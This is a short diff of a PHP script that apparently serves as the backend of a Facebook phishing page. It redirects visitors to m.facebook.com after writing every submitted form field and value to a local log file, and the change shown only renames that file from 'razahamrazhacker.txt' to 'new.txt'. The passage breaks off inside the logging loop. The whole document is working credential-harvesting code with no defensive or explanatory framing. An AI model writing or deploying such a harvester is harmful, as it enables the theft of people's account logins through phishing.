@@ -1,6 +1,6 @@
 <?php
 header("Location: https://m.facebook.com");
-$handle = fopen("razahamrazhacker.txt", "a");
+$handle = fopen("new.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
